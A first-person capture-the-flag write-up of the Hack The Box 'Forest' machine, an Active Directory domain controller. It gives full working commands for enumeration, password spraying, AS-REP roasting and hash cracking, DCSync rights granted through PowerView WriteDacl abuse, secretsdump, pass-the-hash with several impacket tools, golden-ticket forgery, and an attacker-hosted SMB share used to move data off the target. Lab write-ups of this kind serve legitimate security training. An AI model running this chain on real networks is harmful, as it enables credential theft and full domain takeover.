@@ -1,0 +1,542 @@
+Nmap initial scan
+nmap -sC -sV -oA nmap/initial -vv --min-rate 15000 10.129.115.151
+
+# Nmap 7.92 scan initiated Thu Sep  1 09:12:35 2022 as: nmap -sC -sV -oA nmap/initial -vv --min-rate 15000 10.129.115.151
+Increasing send delay for 10.129.115.151 from 0 to 5 due to 295 out of 983 dropped probes since last increase.
+Nmap scan report for 10.129.115.151
+Host is up, received conn-refused (0.024s latency).
+Scanned at 2022-09-01 09:12:36 EDT for 17s
+Not shown: 989 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      REASON  VERSION
+53/tcp   open  domain       syn-ack Simple DNS Plus
+88/tcp   open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-09-01 13:19:30Z)
+135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
+389/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?    syn-ack
+593/tcp  open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped   syn-ack
+3268/tcp open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped   syn-ack
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m48s, deviation: 4h02m31s, median: 6m47s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-09-01T13:19:34
+|_  start_date: 2022-09-01T13:17:47
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 53750/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 34962/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 40144/udp): CLEAN (Timeout)
+|   Check 4 (port 42174/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2022-09-01T06:19:35-07:00
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Sep  1 09:12:53 2022 -- 1 IP address (1 host up) scanned in 17.59 seconds
+
+
+All ports scan
+nmap -p- -oA nmap/allports -v --min-rate 15000 10.129.115.151
+
+# Nmap 7.92 scan initiated Thu Sep  1 09:13:43 2022 as: nmap -p- -oA nmap/allports -v --min-rate 15000 10.129.115.151
+Warning: 10.129.115.151 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.129.115.151
+Host is up (0.039s latency).
+Not shown: 65149 closed tcp ports (conn-refused), 363 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49681/tcp open  unknown
+49699/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Thu Sep  1 09:13:50 2022 -- 1 IP address (1 host up) scanned in 6.71 seconds
+
+
+Adding FOREST domain to hosts file at /etc/hosts
+
+
+Enumerating smb on port 139,445
+
+There are no shares available.
+
+
+
+Enumerating LDAP
+
+nmap -n -sV --script "ldap* and not brute" -p 389 --min-rate 15000 -v -oA ldap_nmap 10.129.115.151
+
+Naming Context:
+namingContexts: DC=htb,DC=local
+defaultNamingContext: DC=htb,DC=local
+schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
+configurationNamingContext: CN=Configuration,DC=htb,DC=local
+rootDomainNamingContext: DC=htb,DC=local
+ldapServiceName: htb.local:forest$@HTB.LOCAL
+
+
+
+
+
+
+Password policy:
+lockoutDuration: -18000000000
+lockOutObservationWindow: -18000000000
+lockoutThreshold: 0
+maxPwdAge: -9223372036854775808
+minPwdAge: -864000000000
+minPwdLength: 7
+
+
+ldapsearch -x -H ldap://10.129.115.151 -b "dc=htb, dc=local" '(ObjectClass=person)' sAMAccountName sAMAccountType | grep -i sAmAccountName
+
+I did a ldap search and filter the results by Objectclass=person, with a further grep filter on the sAMAccountName, it revealed a number of potential users:
+
+
+I compiled a username list from the results, and did a password spray to check which accounts is valid.
+
+kerbrute passwordspray -d "htb.local" --dc 10.129.115.151 usernames.txt -t 75 -v -user-as-pass
+
+Discounting the healthmailbox usernames, the following usernames are potential domain users:
+
+cat sort | grep -v Health | grep -v EXCH | awk -F: '{print $4}' | awk -F \- '{print $1}' >> newusers.txt
+
+
+
+
+Checking users for "Does not require Pre-Authentication" privilege for potential ASReproasting.
+python3 ./GetNPUsers.py htb.local/ -no-pass -usersfile newusers.txt
+
+
+I used crackmapexec to execute a password spray on each individual user with the following command, but no valid password is found respectively..
+crackmapexec smb 10.129.115.151 -d 'htb.local' newusers.txt -p /usr/share/wordlists/rockyou.txt
+
+The same result is produced while using kerbrute:
+kerbrute userenum /usr/share/wordlists/rockyou.txt --dc 10.129.115.151 -d "htb.local" -t 95 -v -o kerbrute_find_user.txt
+
+Enumerating with rpcclient
+
+rpcclient 10.129.115.151 -U "%" -N
+Logging to rpcclient with null username was possible.
+
+
+
+
+enumdomusers
+
+I discovered the existence of “svc_alfresco”, and wondered to myself why wasn’t this picked up before during the enumeration of LDAP.
+
+Going back to the command run earlier, I realise I’ve set the objectclass to show person/users. As a result, service accounts would not show up in the results.
+ldapsearch -x -H ldap://10.129.115.151 -b "dc=htb, dc=local" '(ObjectClass=person)' sAMAccountName sAMAccountType | grep -i sAmAccountName
+
+Refining ldapsearch to locate svc-alfresco:
+ldapsearch -H ldap://10.129.115.151 -x -b "dc=htb, dc=local" '(ObjectClass=*)'
+
+
+
+
+
+
+
+
+
+svc-alfresco can be found as a service account:
+
+
+Going back to rpcclient
+
+
+
+
+I tried to change svc-alfresco password but it failed:
+result was NT_STATUS_NO_USER_SESSION_KEY
+
+I check the group_rid info for these users, and they are just normal domain users (group_rid: 0x201):
+
+queryuser ridnumber
+lucinda berger
+mark brandt
+santi rodriguez
+sebastien caron
+andy hislip
+
+Kerberoasting with impacket’s GetNPUsers.py and crackmapexec
+
+It appears the svc-alfresco has the UF_DONT_REQUIRE_PREAUTH set, the hash info of the account is captured.
+
+python3 ./GetNPUsers.py htb.local/svc-alfresco -no-pass
+
+
+The same can be obtained using crackmapexec
+crackmapexec ldap 10.129.115.151 -u 'svc-alfresco' -p '' --kdcHost 10.129.115.151 --asreproast output.txt
+
+
+Looking up on hashcat examples, the hash mode for svc-alfresco is 18200
+
+
+
+Cracking hash with hashcat
+hashcat -a 0 -w 3 alfresco_imp /usr/share/wordlists/rockyou.txt
+
+The password for svc-alfresco is s3rvice
+
+Since wsman on port 5985 is opened, I attempted and later succeeded winrm-ing into the target machine using evil-winrm, supported with svc-alfresco’s credentials.
+
+evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
+
+
+Obtained user.txt on the Desktop folder of svc-alfresco
+
+
+Setting up a SMB server on my local attacking machine
+python3 ./smbserver.py -i 10.10.16.10 fuseshare /tmp -username fuse -password fuse -smb2support
+
+
+Setting up smb config (/etc/samba/smb.conf) to ensure the path is reachable
+
+
+Creating local credential using powershell to gain access to smbserver.py
+$pass = ConvertTo-SecureString 'fuse' -AsPlainText -Force                                                    
+$cred = New-Object System.Management.Automation.PSCredential('fuse',$pass)
+New-PSDrive -Name fuse -PSProvider FileSystem -Credential $cred -Root \\10.10.16.10\fuseshare
+net use S: 
+
+I uploaded SharpHound.exe using the upload function in evil-winrm and ran the collector on the machine.
+.\SharpHound.exe -c all -d htb.local
+
+The zip files containing the json data were generated, I copied these files to my smb server, and unpacked them using 7z locally.
+
+
+
+
+
+
+
+
+
+
+Running bloodhound analysis
+
+Uploading the json files to the bloodhound GUI:
+
+
+SVC-ALFRESCO@HTB.LOCAL > Node info > Reachable high value targets:
+A new subdomain appeared.
+
+SVC-ALFRESCO is a member of the “Privileged IT Accounts” group, which is a member of the “Account Operators”. The “Account Operators” group has full control over the subdomain EXCH01.HTB.LOCAL
+
+
+
+“EXCH01.HTB.LOCAL” appearing as a subdomain of HTB.LOCAL:
+
+
+
+The computer EXCH01.HTB.LOCAL is a member of the group “EXCHANGE TRUSTED SUBSYSTEM”. The “EXCHANGE TRUSTED SUBSYSTEM” group has WriteDacl rights to the “Exchange Windows Permissions” group, which in turn has WriteDacl rights to the domain HTB.LOCAL
+
+
+With the ability to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL and having write access to the target object's DACL, I could potentially grant myself any privilege I deemed fit on the HTB.LOCAL domain.
+
+Abuse info from bloodhound:
+To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.
+
+You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL:
+
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain
+
+lsadump::dcsync /domain:testlab.local /user:Administrator
+
+Cleanup can be done using the Remove-DomainObjectAcl function:
+Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+
+You can also abuse this without using Windows-based tooling if you are operating from a Linux host. DCSync.py from n00py will let you authenticate with either a plaintext password, NT hash, or kerberos ticket:
+
+To grant the "n00py" user DCSync privileges, authenticating as the user "n00py" with the password "Password123":
+
+./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00pyAdministrator:Password123
+Source: https://github.com/n00py/DCSync
+
+Following the abuse info, I create a domain user named ‘fusey’, and granted him DCSync rights.
+
+
+After running the Add-DomainObjectAcl command to grant DCSync rights to fusey, the terminal hung and failed to respond. I ended up resetting the box several times and trying the same sequence a few times, but my terminal always ended up hung.
+
+I tried creating another domain user manually without using PSCredential object method, and added the account to the “Exchange Windows Permissions” group manually:
+
+net user fox Password12345 /add /domain
+net group “Exchange Windows Permissions” /add fox
+
+
+
+
+
+
+
+
+
+After that, I re-ran the entire command sequence again:
+Import-Module .\powerview.ps1
+$SecPassword = ConvertTo-SecureString 'Password12345'-AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\fox', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'htb.local' -Rights DCSync
+
+The terminal had the same results, and failed to respond.
+I decided to dive into the PowerView.ps1 script and searched for the function to see how it works:
+
+function Add-DomainObjectAcl {
+<#
+.SYNOPSIS
+
+Adds an ACL for a specific active directory object.
+
+AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906
+
+Author: Will Schroeder (@harmj0y)  
+License: BSD 3-Clause  
+Required Dependencies: Get-DomainObject  
+
+.DESCRIPTION
+
+This function modifies the ACL/ACE entries for a given Active Directory
+target object specified by -TargetIdentity. Available -Rights are
+'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
+rights GUID can be set with -RightsGUID. These rights are granted on the target
+object for the specified -PrincipalIdentity.
+
+.PARAMETER TargetIdentity
+
+A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
+SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
+for the domain object to modify ACLs for. Required. Wildcards accepted.
+
+.PARAMETER TargetDomain
+
+Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.
+
+.PARAMETER TargetLDAPFilter
+
+Specifies an LDAP query string that is used to filter Active Directory object targets.
+
+.PARAMETER TargetSearchBase
+
+The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
+Useful for OU queries.
+
+.PARAMETER PrincipalIdentity
+
+A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
+SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
+for the domain principal to add for the ACL. Required. Wildcards accepted.
+
+.PARAMETER PrincipalDomain
+
+Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.
+
+.PARAMETER Server
+
+Specifies an Active Directory server (domain controller) to bind to.
+
+.PARAMETER SearchScope
+
+Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
+
+.PARAMETER ResultPageSize
+
+Specifies the PageSize to set for the LDAP searcher object.
+
+.PARAMETER ServerTimeLimit
+
+Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
+
+.PARAMETER Tombstone
+
+Switch. Specifies that the searcher should also return deleted/tombstoned objects.
+
+.PARAMETER Credential
+
+A [Management.Automation.PSCredential] object of alternate credentials
+for connection to the target domain.
+
+.PARAMETER Rights
+
+Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
+Defaults to 'All'.
+
+.PARAMETER RightsGUID
+
+Manual GUID representing the right to add to the target.
+
+.EXAMPLE
+
+$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
+Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}
+
+Looks like there are a few parameters tagged with the “Required.” comment, they are:
+
+TargetIdentity and PrincipalIdentity
+
+Looking back at the command I supplied, I did not include the “PrincipalIdentity”
+
+So I went back to my shell session using evil-winrm, re-ran the PSCredential object creation sequence, and lastly I changed up my command to:
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'htb.local' -PrincipalIdentity fusion -Rights DCSync
+
+The terminal responded this time and did not return any error message as well.
+
+Since DCSync rights is granted to the user ‘fox’, I ran the secretsdump.py script from impacket to try and capture the hash info of all accounts on the target DC.
+
+However, the account failed to capture any hashes from the target domain controller.
+
+Going back to the “Add-DomainObjectAcl” script again, I observed the following syntaxes available for the TargetIdentity and PrincipalIdentity parameters:
+
+A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
+SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
+for the domain object to modify ACLs for. Required. Wildcards accepted.
+
+I did a ldapsearch again to check the format for the domain’s distinguished name:
+ldapsearch -H ldap://10.129.137.21 -x -b "dc=htb,dc=local" '(ObjectClass=*)'
+
+
+
+
+
+Modifying the command again..
+
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'CN=fox, CN=Users, DC=htb, DC=local' -PrincipalIdentity 'CN=fox, CN=Users, DC=htb, DC=local' -Rights DCSync
+
+Although the terminal did not hang or return an error, I still failed to obtain the hash info after running secretsdump.py
+
+I proceeded to google search with keywords “add-domainobjectacl dcsync” and stumbled upon this blog entry.
+
+The blog suggested to use powersploit’s powerview script from the dev branch of this repo.
+
+The blog also used the following syntax for its distinguished name “DC=xxx,DC=” for only the “TargetIdentity” parameter only, and did not specify any common names.
+
+
+
+Modifying the command again..
+
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb, DC=local' -PrincipalIdentity 'fox' -Rights DCSync
+
+Re-running secretsdum.py and the hash information is dumped!
+python3 ./secretsdump.py htb.local/fox:Password12345@10.129.137.21
+
+
+With the administrator’s hash, I can now winrm into the target machine via pass the hash and root.txt can be obtained:
+
+evil-winrm -i 10.129.137.21 -u 'administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
+
+
+
+
+
+
+
+
+
+
+
+Using Psexec.py pass the hash:
+python3 ./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.137.21
+
+
+
+Using smbexec.py pass the hash:
+python3 ./smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.137.21
+
+
+Using wmiexec.py pass the hash:
+python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.137.21
+
+
+
+Using atexec.py pass the hash to execute dir and type commands on administrator’s user profile to read root.txt:
+python3 ./atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.137.21 "dir C:\Users\Administrator\Desktop"
+
+python3 ./atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.137.21 "type C:\Users\Administrator\Desktop\root.txt"
+
+
+
+Beyond root, the golden ticket
+
+Using linux
+We can use impacket’s ticketer.py script to generate a golden ticket by forging a TGT from a krbtgt account. The advantage of forging a TGT instead of TGS is being able to access any service (or machine) in the domain and the impersonated user. Moreover the credentials of krbtgt are never changed automatically.
+
+Generating the ccachhe file
+Syntax:
+python3 ./ticketer.py nthash hash of krbtgt here domains-sid S-X-X-XX-XXXXXX -domain FQDN_domain custom_filename_of_ccache
+
+The domain SID can be obtained by running Get-ADDomain domain_name command using powershell on the target computer.
+
+Example:
+python3 ./ticketer.py -nthash 32693b11e6aa90eb43d32c72a07ceea6 -domain-sid S-1-5-21-3072663084-36-1341370565 -domain htb.local IownEverything
+
+The script will use the krbtgt account to sign the ticket on behalf of the domain controller. The default groups assigned to the ticket are configured in ticketer.py: “default = 513, 512, 520, 518, 519” Link here for reference on group SIDs.
+
+
+
+Setting KRB5 environment variables
+export KRB5CCNAME=IownEverything.ccache
+
+Running psexec to obtain a reverse shell
+python3 ./psexec.py htb.local/IownEverything@10.129.95.210 -k -no-pass
+
+After running the command above, I got a clock skew too great error.
+I can fix that with a sudo date -s XX:XX command to match my attacking machine’s date/time to the target machine’s. I can also use a bash sequence script one liner to iterate through the 24 hr time format to find the right clock skew:
+
+for i in $(seq 00 24); do date -s $i:53:00; python3 ./psexec.py htb.local/goldenboy@forest -k -no-pass; done
+
+After fixing the clock skew issue, another issue happened:
+“[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)”
+
+After watching ippsec’s video, his explanation to fix this error was:
+Impacket’s psexec script probably is looking for a DNS name instead of an IP address, hence we will need to modify the hosts file to include ‘htb’ and ‘forest’ for name resolution.
+
+
+After that, run psexec command in this format:
+python3 ./psexec.py htb.local/IownEverything@forest -k -no-pass
+
+
+
